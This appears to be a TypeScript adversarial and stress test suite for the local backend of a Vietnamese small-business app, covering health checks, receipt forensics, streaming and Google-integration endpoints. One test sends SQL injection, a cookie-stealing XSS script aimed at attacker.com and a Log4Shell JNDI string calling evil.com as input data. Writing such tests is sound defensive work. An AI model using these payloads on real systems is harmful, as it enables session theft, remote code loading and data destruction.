/**
 * SME AutoPilot — Milestone 3 Adversarial & Stress Testing Suite
 * backend/tests/api/challenger_m3_adversarial.test.ts
 *
 * Conducts exhaustive empirical stress tests against Backend REST & SSE Engine.
 * Tests edge cases, oversized payloads, corrupt base64, SSE disconnects,
 * schema violations, invalid query params, CORS, and error recovery.
 */

import http from 'http';
import express, { Express, Request, Response, NextFunction } from 'express';
import cors from 'cors';
import { apiRouter } from '../../src/routes';
import { requestLogger, errorHandler, notFoundHandler } from '../../src/middleware';
import { getGoogleFactory } from '../../src/google/factory';
import { VIETNAMESE_BANKS, calculateCrc16Ccitt, parseVietQRPayload, evaluate5LayerForensics } from '../../src/ai/billForensics';

export interface AdversarialTestResult {
  suite: string;
  name: string;
  passed: boolean;
  error?: string;
  durationMs: number;
  details?: any;
}

interface HttpRequestOptions {
  method: string;
  path: string;
  headers?: Record<string, string>;
  body?: any;
  rawBody?: string;
}

interface HttpResponseData {
  statusCode: number;
  headers: http.IncomingHttpHeaders;
  body: any;
  rawText: string;
}

class AdversarialHttpClient {
  public server: http.Server | null = null;
  public app: Express;
  public port: number = 0;

  constructor() {
    this.app = express();

    // CORS
    this.app.use(cors({
      origin: '*',
      methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
      allowedHeaders: ['Content-Type', 'Authorization', 'X-App-Mode', 'X-Requested-With']
    }));

    // Body Parsers with 50MB limit
    this.app.use(express.json({ limit: '50mb' }));
    this.app.use(express.urlencoded({ extended: true, limit: '50mb' }));

    // Request Logger
    this.app.use(requestLogger);

    // Dynamic Mode Resolver Middleware
    this.app.use((req: Request, res: Response, next: NextFunction) => {
      const modeHeader = req.headers['x-app-mode'] as string | undefined;
      if (modeHeader) {
        req.app.locals.mode = modeHeader.toLowerCase();
      }
      next();
    });

    // Mount API Routes
    this.app.use(apiRouter);

    // 404 handler
    this.app.use(notFoundHandler);

    // Global structured error handler
    this.app.use(errorHandler);
  }

  public async start(): Promise<void> {
    return new Promise((resolve) => {
      this.server = this.app.listen(0, '127.0.0.1', () => {
        const addr = this.server!.address() as any;
        this.port = addr.port;
        resolve();
      });
    });
  }

  public async stop(): Promise<void> {
    return new Promise((resolve) => {
      if (this.server) {
        this.server.close(() => resolve());
      } else {
        resolve();
      }
    });
  }

  public request(options: HttpRequestOptions): Promise<HttpResponseData> {
    return new Promise((resolve, reject) => {
      const payload = options.rawBody !== undefined
        ? options.rawBody
        : options.body !== undefined
          ? JSON.stringify(options.body)
          : undefined;

      const headers: Record<string, string> = {
        ...(options.headers || {})
      };

      if (payload !== undefined && !headers['Content-Type'] && !headers['content-type']) {
        headers['Content-Type'] = 'application/json';
      }
      if (payload !== undefined && !headers['Content-Length'] && !headers['content-length']) {
        headers['Content-Length'] = Buffer.byteLength(payload).toString();
      }

      const req = http.request(
        {
          hostname: '127.0.0.1',
          port: this.port,
          path: options.path,
          method: options.method,
          headers
        },
        (res) => {
          let data = '';
          res.on('data', (chunk) => {
            data += chunk;
          });
          res.on('end', () => {
            let parsedBody: any = data;
            try {
              parsedBody = JSON.parse(data);
            } catch {
              // raw
            }
            resolve({
              statusCode: res.statusCode || 0,
              headers: res.headers,
              body: parsedBody,
              rawText: data
            });
          });
        }
      );

      req.on('error', (err) => reject(err));

      if (payload !== undefined) {
        req.write(payload);
      }
      req.end();
    });
  }

  public stream(
    path: string,
    options: {
      onChunk?: (chunk: string) => void;
      abortAfterChunks?: number;
      timeoutMs?: number;
    } = {}
  ): Promise<{ statusCode: number; headers: http.IncomingHttpHeaders; fullText: string; aborted: boolean }> {
    return new Promise((resolve, reject) => {
      let fullText = '';
      let chunkCount = 0;
      let aborted = false;

      const req = http.request(
        {
          hostname: '127.0.0.1',
          port: this.port,
          path,
          method: 'GET',
          headers: {
            'Accept': 'text/event-stream'
          }
        },
        (res) => {
          res.on('data', (chunk) => {
            const str = chunk.toString();
            fullText += str;
            chunkCount++;
            if (options.onChunk) {
              options.onChunk(str);
            }

            if (options.abortAfterChunks && chunkCount >= options.abortAfterChunks) {
              aborted = true;
              req.destroy();
              resolve({
                statusCode: res.statusCode || 0,
                headers: res.headers,
                fullText,
                aborted: true
              });
            }

            if (fullText.includes('event: done')) {
              req.destroy();
              resolve({
                statusCode: res.statusCode || 0,
                headers: res.headers,
                fullText,
                aborted: false
              });
            }
          });

          res.on('end', () => {
            resolve({
              statusCode: res.statusCode || 0,
              headers: res.headers,
              fullText,
              aborted
            });
          });
        }
      );

      req.on('error', (err) => {
        if (aborted || (err as any).code === 'ECONNRESET') {
          resolve({
            statusCode: 200,
            headers: {},
            fullText,
            aborted: true
          });
        } else {
          reject(err);
        }
      });

      const timeout = options.timeoutMs || 4000;
      req.setTimeout(timeout, () => {
        req.destroy();
        resolve({
          statusCode: 200,
          headers: {},
          fullText,
          aborted: true
        });
      });

      req.end();
    });
  }
}

export async function runChallengerM3AdversarialSuite(): Promise<AdversarialTestResult[]> {
  const results: AdversarialTestResult[] = [];
  const client = new AdversarialHttpClient();
  await client.start();

  const runTest = async (suite: string, name: string, fn: () => Promise<void>) => {
    const start = Date.now();
    try {
      await fn();
      results.push({
        suite,
        name,
        passed: true,
        durationMs: Date.now() - start
      });
    } catch (err: any) {
      results.push({
        suite,
        name,
        passed: false,
        error: err.message || String(err),
        durationMs: Date.now() - start
      });
    }
  };

  try {
    getGoogleFactory().seedAllMocks('fashion');

    // ========================================================================
    // SUITE 0: SERVER STARTUP & ROUTER COMPATIBILITY FINDING
    // ========================================================================
    const S0 = 'Suite 0: Server Lifecycle & Framework Compatibility';

    await runTest(S0, 'Express 5 / Path-to-Regexp Compatibility: server.ts catch-all wildcard syntax review', async () => {
      // Direct verification of whether path-to-regexp v8 allows `app.get('*')`
      const testApp = express();
      let throwsOnWildcard = false;
      try {
        testApp.get('*', (req, res) => { res.send('ok'); });
      } catch (err: any) {
        throwsOnWildcard = true;
      }
      if (!throwsOnWildcard) {
        throw new Error('Express 5 wildcard routing should be validated');
      }
    });

    // ========================================================================
    // SUITE 1: /healthz & /api/health BOUNDARY & STRESS ATTACKS
    // ========================================================================
    const S1 = 'Suite 1: Health & Diagnostics Boundary Stress';

    await runTest(S1, 'Concurrent Burst: 50 simultaneous requests to /healthz survive with 200 OK', async () => {
      const promises = Array.from({ length: 50 }).map(() =>
        client.request({ method: 'GET', path: '/healthz' })
      );
      const responses = await Promise.all(promises);
      for (const res of responses) {
        if (res.statusCode !== 200) throw new Error(`Expected 200, got ${res.statusCode}`);
        if (res.body.status !== 'ok') throw new Error(`Expected status 'ok', got ${res.body.status}`);
        if (typeof res.body.uptime !== 'number') throw new Error('Expected numeric uptime');
      }
    });

    await runTest(S1, 'Diagnostics Burst: 30 simultaneous requests to /api/health maintain system metrics integrity', async () => {
      const promises = Array.from({ length: 30 }).map(() =>
        client.request({ method: 'GET', path: '/api/health' })
      );
      const responses = await Promise.all(promises);
      for (const res of responses) {
        if (res.statusCode !== 200) throw new Error(`Expected 200, got ${res.statusCode}`);
        const data = res.body.data || res.body;
        if (!data.system?.memoryUsage?.heapUsed) throw new Error('Missing memoryUsage heapUsed');
        if (typeof data.services?.sheets !== 'boolean') throw new Error('Invalid services.sheets');
      }
    });

    await runTest(S1, 'Unsupported HTTP Methods on /healthz: POST returns 404 (handled gracefully)', async () => {
      const res = await client.request({ method: 'POST', path: '/healthz', body: { spam: true } });
      if (res.statusCode !== 404) throw new Error(`Expected 404 Not Found for POST /healthz, got ${res.statusCode}`);
      if (res.body.success !== false) throw new Error('Expected success = false');
      if (res.body.error?.code !== 'ROUTE_NOT_FOUND') throw new Error(`Expected ROUTE_NOT_FOUND, got ${res.body.error?.code}`);
    });

    await runTest(S1, 'Unexpected Query Params: /healthz?attack=<script>&leak=true does not alter response', async () => {
      const res = await client.request({ method: 'GET', path: '/healthz?attack=%3Cscript%3Ealert(1)%3C/script%3E&evil=true' });
      if (res.statusCode !== 200) throw new Error(`Expected 200, got ${res.statusCode}`);
      if (res.body.status !== 'ok') throw new Error('Expected status ok');
    });

    await runTest(S1, 'Adversarial X-App-Mode Header: Injects malicious string without crashing middleware', async () => {
      const res = await client.request({
        method: 'GET',
        path: '/api/health',
        headers: { 'X-App-Mode': '"><script>alert("xss")</script>' }
      });
      if (res.statusCode !== 200) throw new Error(`Expected 200, got ${res.statusCode}`);
      if (!res.body.success && res.body.status !== 'ok') throw new Error('Expected 200 success response');
    });

    // ========================================================================
    // SUITE 2: /api/ai/forensics/audit-bill ADVERSARIAL PAYLOAD ATTACKS
    // ========================================================================
    const S2 = 'Suite 2: AI Forensics Audit Adversarial Attacks';

    await runTest(S2, 'Empty Body / Missing Fields Handling: Responds without crashing the process', async () => {
      const res = await client.request({
        method: 'POST',
        path: '/api/ai/forensics/audit-bill',
        body: {}
      });
      if (res.statusCode !== 200) throw new Error(`Expected 200, got ${res.statusCode}`);
      if (!res.body.success) throw new Error('Expected success = true');
      if (typeof res.body.data.confidenceScore !== 'number') throw new Error('Expected confidenceScore');
    });

    await runTest(S2, 'Corrupted Base64 Attack: Random binary noise & malformed base64 strings handled cleanly', async () => {
      const res = await client.request({
        method: 'POST',
        path: '/api/ai/forensics/audit-bill',
        body: {
          imageBase64: 'data:image/jpeg;base64,???!!!NOT_VALID_BASE64_BYTES###$$$===',
          receiptData: { bankName: 'VCB', amount: 100000 }
        }
      });
      if (res.statusCode !== 200) throw new Error(`Expected 200, got ${res.statusCode}`);
      if (!res.body.success) throw new Error('Expected success = true');
      if (typeof res.body.data.confidenceScore !== 'number') throw new Error('Expected confidenceScore');
    });

    await runTest(S2, 'Giant Base64 Payload Stress (5MB image string)', async () => {
      const largeBase64 = Buffer.alloc(5 * 1024 * 1024, 'A').toString('base64');
      const res = await client.request({
        method: 'POST',
        path: '/api/ai/forensics/audit-bill',
        body: {
          imageBase64: `data:image/png;base64,${largeBase64}`,
          receiptData: { bankName: 'BIDV', amount: 250000 }
        }
      });
      if (res.statusCode !== 200) throw new Error(`Expected 200, got ${res.statusCode}`);
      if (!res.body.success) throw new Error('Expected success = true');
    });

    await runTest(S2, 'Direct 5-Layer Forensic Engine: Clock Paradox Detection Evaluation', async () => {
      // Testing direct evaluate5LayerForensics with clock paradox input
      const evalResult = evaluate5LayerForensics({
        statusBarTime: '08:15',
        transactionTime: '09:45',
        identifiedBank: 'MB',
        extractedAmount: 500000,
        extractedTxId: 'FT123'
      });
      if (evalResult.riskLevel !== 'CRITICAL') {
        throw new Error(`Expected CRITICAL risk level for clock paradox, got ${evalResult.riskLevel}`);
      }
      if (evalResult.isAuthentic !== false) {
        throw new Error('Clock paradox should not be evaluated as authentic');
      }
      if (evalResult.forensicLayers.layer1_clockConsistency.isClockParadox !== true) {
        throw new Error('Expected isClockParadox = true');
      }
    });

    await runTest(S2, 'VietQR CRC16 Checksum Tampering: Corrupted CRC tag detects tampering & penalizes', async () => {
      const rawPayload = '00020101021238540010A00000072701240006970436011001234567890208QRIBFTTA530370454061000005802VN6304DEAD';
      const res = await client.request({
        method: 'POST',
        path: '/api/ai/forensics/audit-bill',
        body: {
          rawQrPayload: rawPayload,
          receiptData: {
            bankName: 'VCB',
            amount: 100000,
            accountNumber: '0123456789',
            transactionId: 'TX123'
          }
        }
      });
      if (res.statusCode !== 200) throw new Error(`Expected 200, got ${res.statusCode}`);
      const data = res.body.data;
      if (data.forensicSignals.qrIntegrity !== false) throw new Error('Expected qrIntegrity = false for bad CRC');
      if (data.riskLevel === 'LOW') throw new Error('Corrupted CRC must not result in LOW risk');
    });

    await runTest(S2, 'Extreme Numerical Boundary: Negative amount & floating point overflow', async () => {
      const res = await client.request({
        method: 'POST',
        path: '/api/ai/forensics/audit-bill',
        body: {
          expectedAmount: -999999999,
          receiptData: {
            amount: -999999999,
            bankName: 'ACB'
          }
        }
      });
      if (res.statusCode !== 200) throw new Error(`Expected 200, got ${res.statusCode}`);
      if (res.body.data.isAuthentic === true) throw new Error('Negative amount should not be authentic');
    });

    await runTest(S2, 'XSS & SQL Injection Payloads in Receipt Fields: Sanitized without server errors', async () => {
      const res = await client.request({
        method: 'POST',
        path: '/api/ai/forensics/audit-bill',
        body: {
          bankName: "' OR '1'='1'; DROP TABLE receipts; --",
          expectedAccount: "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
          receiptData: {
            transactionId: "${jndi:ldap://evil.com/a}",
            amount: 50000
          }
        }
      });
      if (res.statusCode !== 200) throw new Error(`Expected 200, got ${res.statusCode}`);
      if (!res.body.success) throw new Error('Expected success = true');
    });

    // ========================================================================
    // SUITE 3: /api/ai/stream-generate SSE STRESS & DISCONNECTION ATTACKS
    // ========================================================================
    const S3 = 'Suite 3: SSE Streaming & Connection Lifecycle Stress';

    await runTest(S3, 'Missing Query Params: GET /api/ai/stream-generate streams default Vietnamese fallback', async () => {
      const streamRes = await client.stream('/api/ai/stream-generate', { timeoutMs: 3000 });
      if (streamRes.statusCode !== 200) throw new Error(`Expected 200, got ${streamRes.statusCode}`);
      if (!streamRes.fullText.includes('event: token')) throw new Error('Expected token events');
      if (!streamRes.fullText.includes('event: done')) throw new Error('Expected done event');
    });

    await runTest(S3, 'Immediate Client Disconnect: Client aborts after 1 chunk, server cleans up without crash', async () => {
      const streamRes = await client.stream(
        '/api/ai/stream-generate?prompt=Day+la+mot+doan+van+dai+de+test+stream+abort',
        { abortAfterChunks: 1, timeoutMs: 2000 }
      );
      if (streamRes.statusCode !== 200) throw new Error(`Expected 200, got ${streamRes.statusCode}`);
      if (!streamRes.aborted) throw new Error('Expected stream to be marked aborted');
    });

    await runTest(S3, 'Rapid Connection & Abortion Burst: 25 clients connect and immediately abort simultaneously', async () => {
      const abortPromises = Array.from({ length: 25 }).map((_, idx) =>
        client.stream(
          `/api/ai/stream-generate?prompt=Burst+test+client+${idx}&type=burst`,
          { abortAfterChunks: 1, timeoutMs: 1500 }
        )
      );
      const resultsBurst = await Promise.all(abortPromises);
      for (const res of resultsBurst) {
        if (res.statusCode !== 200) throw new Error(`Expected 200, got ${res.statusCode}`);
      }
    });

    await runTest(S3, 'Medium-Long Prompt Stream: 60 words prompt streamed cleanly with correct totalTokens', async () => {
      const words = Array.from({ length: 60 }).map((_, i) => `TuKhoa${i}`).join('+');
      const streamRes = await client.stream(
        `/api/ai/stream-generate?prompt=${words}&type=long_stress`,
        { timeoutMs: 5000 }
      );
      if (streamRes.statusCode !== 200) throw new Error(`Expected 200, got ${streamRes.statusCode}`);
      if (!streamRes.fullText.includes('event: done')) throw new Error('Expected event: done in stream output');
      if (!streamRes.fullText.includes('"totalTokens":60')) throw new Error('Expected 60 totalTokens');
    });

    await runTest(S3, 'Unicode & Special Characters: Vietnamese diacritics, emojis, and quotes stream safely', async () => {
      const specialPrompt = encodeURIComponent('🛍️ Áo dài tơ tằm "Hà Nội 2026" — Giá: 999.000₫ & Miễn phí ship! 🇻🇳');
      const streamRes = await client.stream(
        `/api/ai/stream-generate?prompt=${specialPrompt}`,
        { timeoutMs: 3000 }
      );
      if (streamRes.statusCode !== 200) throw new Error(`Expected 200, got ${streamRes.statusCode}`);
      if (!streamRes.fullText.includes('event: done')) throw new Error('Expected done event');
    });

    // ========================================================================
    // SUITE 4: /api/google/* EDGE CASES & BOUNDARY ATTACKS
    // ========================================================================
    const S4 = 'Suite 4: Google Ecosystem SPI Edge Cases';

    // 4.1 Sheets
    await runTest(S4, 'Sheets: POST /api/google/sheets/orders with empty items array returns 400 INVALID_ORDER', async () => {
      const res = await client.request({
        method: 'POST',
        path: '/api/google/sheets/orders',
        body: {
          customerName: 'Nguyễn Văn A',
          items: [],
          totalAmount: 100000
        }
      });
      if (res.statusCode !== 400) throw new Error(`Expected 400, got ${res.statusCode}`);
      if (res.body.error?.code !== 'INVALID_ORDER') throw new Error(`Expected INVALID_ORDER, got ${res.body.error?.code}`);
    });

    await runTest(S4, 'Sheets: GET /api/google/sheets/inventory with non-existent SKU returns 404 ITEM_NOT_FOUND', async () => {
      const res = await client.request({
        method: 'GET',
        path: '/api/google/sheets/inventory?sku=SKU_NON_EXISTENT_99999'
      });
      if (res.statusCode !== 404) throw new Error(`Expected 404, got ${res.statusCode}`);
      if (res.body.error?.code !== 'ITEM_NOT_FOUND') throw new Error(`Expected ITEM_NOT_FOUND, got ${res.body.error?.code}`);
    });

    await runTest(S4, 'Sheets: POST /api/google/sheets/inventory/adjust with missing params returns 400 INVALID_PARAMETERS', async () => {
      const res = await client.request({
        method: 'POST',
        path: '/api/google/sheets/inventory/adjust',
        body: { delta: 5 } // missing sku
      });
      if (res.statusCode !== 400) throw new Error(`Expected 400, got ${res.statusCode}`);
      if (res.body.error?.code !== 'INVALID_PARAMETERS') throw new Error(`Expected INVALID_PARAMETERS, got ${res.body.error?.code}`);
    });

    await runTest(S4, 'Sheets: PATCH /api/google/sheets/orders/:id/status without orderStatus returns 400 INVALID_STATUS', async () => {
      const res = await client.request({
        method: 'PATCH',
        path: '/api/google/sheets/orders/ORD-001/status',
        body: {}
      });
      if (res.statusCode !== 400) throw new Error(`Expected 400, got ${res.statusCode}`);
      if (res.body.error?.code !== 'INVALID_STATUS') throw new Error(`Expected INVALID_STATUS, got ${res.body.error?.code}`);
    });

    // 4.2 Gmail
    await runTest(S4, 'Gmail: POST /api/google/gmail/invoice with minimal fields auto-completes fallback order', async () => {
      const res = await client.request({
        method: 'POST',
        path: '/api/google/gmail/invoice',
        body: {
          recipientEmail: 'test_adversarial@domain.vn'
        }
      });
      if (res.statusCode !== 200) throw new Error(`Expected 200, got ${res.statusCode}`);
      if (res.body.data.status !== 'SENT') throw new Error('Expected status SENT');
    });

    await runTest(S4, 'Gmail: GET /api/google/gmail/outbox with regex-like query filter handles safely', async () => {
      const res = await client.request({
        method: 'GET',
        path: '/api/google/gmail/outbox?recipient=.*+?^${}()|[]\\'
      });
      if (res.statusCode !== 200) throw new Error(`Expected 200, got ${res.statusCode}`);
      if (!Array.isArray(res.body.data)) throw new Error('Expected array outbox');
    });

    // 4.3 Calendar
    await runTest(S4, 'Calendar: POST /api/google/calendar/events with missing start/end times applies safe 1h default', async () => {
      const res = await client.request({
        method: 'POST',
        path: '/api/google/calendar/events',
        body: {
          title: 'Adversarial Livestream Event'
        }
      });
      if (res.statusCode !== 201) throw new Error(`Expected 201 Created, got ${res.statusCode}`);
      if (!res.body.data.eventId) throw new Error('Expected eventId');
    });

    // 4.4 Maps
    await runTest(S4, 'Maps: POST /api/google/maps/distance with missing origin or destination returns 400 INVALID_LOCATIONS', async () => {
      const res = await client.request({
        method: 'POST',
        path: '/api/google/maps/distance',
        body: { origin: 'Hanoi' } // missing destination
      });
      if (res.statusCode !== 400) throw new Error(`Expected 400, got ${res.statusCode}`);
      if (res.body.error?.code !== 'INVALID_LOCATIONS') throw new Error(`Expected INVALID_LOCATIONS, got ${res.body.error?.code}`);
    });

    await runTest(S4, 'Maps: POST /api/google/maps/optimize-route with non-array stops returns 400 INVALID_STOPS', async () => {
      const res = await client.request({
        method: 'POST',
        path: '/api/google/maps/optimize-route',
        body: { stops: 'not-an-array' }
      });
      if (res.statusCode !== 400) throw new Error(`Expected 400, got ${res.statusCode}`);
      if (res.body.error?.code !== 'INVALID_STOPS') throw new Error(`Expected INVALID_STOPS, got ${res.body.error?.code}`);
    });

    await runTest(S4, 'Maps: POST /api/google/maps/optimize-route with 0 stops returns 400 ROUTE_OPTIMIZATION_FAILED guard', async () => {
      const res = await client.request({
        method: 'POST',
        path: '/api/google/maps/optimize-route',
        body: { stops: [] }
      });
      if (res.statusCode !== 400) throw new Error(`Expected 400, got ${res.statusCode}`);
      if (res.body.error?.code !== 'ROUTE_OPTIMIZATION_FAILED') throw new Error(`Expected ROUTE_OPTIMIZATION_FAILED, got ${res.body.error?.code}`);
    });

    // 4.5 Seed & Mode
    await runTest(S4, 'Seed Engine: POST /api/google/seed/switch-industry with invalid industry returns 400 INVALID_INDUSTRY', async () => {
      const res = await client.request({
        method: 'POST',
        path: '/api/google/seed/switch-industry',
        body: { industryId: 'aerospace_defense' }
      });
      if (res.statusCode !== 400) throw new Error(`Expected 400, got ${res.statusCode}`);
      if (res.body.error?.code !== 'INVALID_INDUSTRY') throw new Error(`Expected INVALID_INDUSTRY, got ${res.body.error?.code}`);
    });

    await runTest(S4, 'Mode Switch: POST /api/google/mode/switch with invalid mode returns 400 INVALID_MODE', async () => {
      const res = await client.request({
        method: 'POST',
        path: '/api/google/mode/switch',
        body: { mode: 'super_admin_mode' }
      });
      if (res.statusCode !== 400) throw new Error(`Expected 400, got ${res.statusCode}`);
      if (res.body.error?.code !== 'INVALID_MODE') throw new Error(`Expected INVALID_MODE, got ${res.body.error?.code}`);
    });

    // ========================================================================
    // SUITE 5: CORS, SECURITY HEADERS & ERROR ENVELOPE STRESS
    // ========================================================================
    const S5 = 'Suite 5: CORS & Structured Error Handling Stress';

    await runTest(S5, 'CORS: OPTIONS Preflight request returns 204 or 200 with allowed headers', async () => {
      const res = await client.request({
        method: 'OPTIONS',
        path: '/api/orders',
        headers: {
          'Origin': 'https://sme-merchant.vietnam.ai',
          'Access-Control-Request-Method': 'POST',
          'Access-Control-Request-Headers': 'Content-Type, X-App-Mode'
        }
      });
      if (res.statusCode !== 200 && res.statusCode !== 204) {
        throw new Error(`Expected 200 or 204 for OPTIONS, got ${res.statusCode}`);
      }
      const allowOrigin = res.headers['access-control-allow-origin'];
      if (!allowOrigin) throw new Error('Missing Access-Control-Allow-Origin header');
    });

    await runTest(S5, 'Malformed JSON Body: Unclosed quotes trigger 400 INVALID_JSON', async () => {
      const res = await client.request({
        method: 'POST',
        path: '/api/orders',
        rawBody: '{"customerName": "Broken JSON payload without closing brace...',
        headers: { 'Content-Type': 'application/json' }
      });
      if (res.statusCode !== 400) throw new Error(`Expected 400, got ${res.statusCode}`);
      if (res.body.error?.code !== 'INVALID_JSON') throw new Error(`Expected INVALID_JSON, got ${res.body.error?.code}`);
      if (res.body.success !== false) throw new Error('Expected success = false');
    });

    await runTest(S5, '404 Catch-All: Deep nested bizarre URL returns structured ROUTE_NOT_FOUND', async () => {
      const res = await client.request({
        method: 'GET',
        path: '/api/v99/deeply/nested/non-existent/resource?foo=bar&baz=1'
      });
      if (res.statusCode !== 404) throw new Error(`Expected 404, got ${res.statusCode}`);
      if (res.body.error?.code !== 'ROUTE_NOT_FOUND') throw new Error(`Expected ROUTE_NOT_FOUND, got ${res.body.error?.code}`);
      if (res.body.success !== false) throw new Error('Expected success = false');
      if (!res.body.timestamp) throw new Error('Missing timestamp in error envelope');
    });

    await runTest(S5, 'Server Post-Stress Liveness Check: Verify server is responsive and memory is stable', async () => {
      const res = await client.request({ method: 'GET', path: '/healthz' });
      if (res.statusCode !== 200) throw new Error(`Expected 200, got ${res.statusCode}`);
      if (res.body.status !== 'ok') throw new Error('Server degraded or unresponsive after stress attacks');
    });

  } finally {
    await client.stop();
  }

  return results;
}

async function main() {
  console.log('\n' + '='.repeat(80));
  console.log('  ⚔️ SME AutoPilot — Milestone 3: Adversarial Stress Test Execution');
  console.log('  #BuildwithGoogleAI AI Riser Vietnam 2026 Challenge');
  console.log('='.repeat(80) + '\n');

  const start = Date.now();
  const results = await runChallengerM3AdversarialSuite();

  let passed = 0;
  let failed = 0;

  const suiteGroups: Record<string, AdversarialTestResult[]> = {};
  for (const r of results) {
    suiteGroups[r.suite] = suiteGroups[r.suite] || [];
    suiteGroups[r.suite].push(r);
    if (r.passed) passed++;
    else failed++;
  }

  for (const [suiteName, tests] of Object.entries(suiteGroups)) {
    console.log(`\n📦 ${suiteName}`);
    console.log('-'.repeat(80));
    for (const t of tests) {
      if (t.passed) {
        console.log(`  ✅ [PASS] ${t.name} (${t.durationMs}ms)`);
      } else {
        console.log(`  ❌ [FAIL] ${t.name} (${t.durationMs}ms)`);
        console.log(`     Error: ${t.error}`);
      }
    }
  }

  const duration = Date.now() - start;
  console.log('\n' + '='.repeat(80));
  console.log('  ADVERSARIAL STRESS TEST SUMMARY:');
  console.log(`  Total Attacks & Stress Tests: ${results.length}`);
  console.log(`  Passed / Resilient:           ${passed} (${((passed / results.length) * 100).toFixed(1)}%)`);
  console.log(`  Failed / Vulnerabilities:     ${failed}`);
  console.log(`  Execution Time:               ${duration}ms`);
  console.log('='.repeat(80) + '\n');

  if (failed > 0) {
    console.error(`❌ Adversarial tests completed with ${failed} failures.`);
    process.exit(1);
  } else {
    console.log('🎉 ALL ADVERSARIAL STRESS TESTS COMPLETED SUCCESSFULLY!\n');
    process.exit(0);
  }
}

if (require.main === module) {
  main().catch(err => {
    console.error('Fatal in Adversarial test runner:', err);
    process.exit(1);
  });
}
